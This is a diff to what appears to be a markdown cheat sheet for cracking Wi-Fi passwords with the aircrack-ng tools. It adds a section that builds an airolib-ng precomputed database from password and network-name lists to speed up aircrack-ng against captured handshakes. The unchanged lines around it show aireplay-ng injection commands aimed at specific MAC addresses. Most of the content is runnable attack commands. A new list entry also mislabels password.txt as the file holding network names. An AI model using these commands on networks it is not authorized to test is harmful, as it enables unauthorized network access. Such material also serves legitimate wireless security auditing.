@@ -7,6 +7,8 @@ In this example
 - `-c X` is the channel of target network
 - `out` is the filename to capture the WPA handshake
 - `password.txt` is the filename to brute force
+- `password.txt` is the file contains name of target network
+- `crackwpa` is the name of database
 
 ## Scan network around
 
@@ -60,6 +62,19 @@ aireplay-ng -1 100 -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
 aireplay-ng -3 0 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
 (wait to capture about 70.000 packet)
 aircrack-ng -a 1 out*.cap
+```
+
+## Speed up crack with database
+
+```
+sudo apt install sqlite3
+airolib-ng crackwpa --import passwd password.txt
+airolib-ng crackwpa --import essid essid.txt
+airolib-ng crackwpa --stats
+airolib-ng crackwpa --clean all
+airolib-ng crackwpa --batch
+airolib-ng crackwpa --verify all
+aircrack-ng -r crackwpa out*.cap
 ```
 
 ## Brute force tools
